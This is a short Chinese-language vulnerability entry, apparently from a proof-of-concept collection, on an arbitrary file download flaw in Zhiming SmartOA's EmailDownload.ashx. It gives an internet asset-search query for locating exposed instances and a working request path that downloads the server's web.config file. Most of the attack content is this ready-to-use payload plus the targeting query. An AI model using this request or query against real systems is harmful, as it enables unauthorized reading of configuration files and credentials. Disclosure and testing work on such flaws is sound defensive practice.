# 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞

## 漏洞描述

智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息

## 漏洞影响

```
智明 SmartOA
```

## 网络测绘

```
app="智明协同-SmartOA"
```

## 漏洞复现

登录页面

![image-20220520133519986](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112853424.png)

验证POC

```
/file/EmailDownload.ashx?url=~/web.config&name=web.config
```

![image-20220520133538762](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326112853425.png)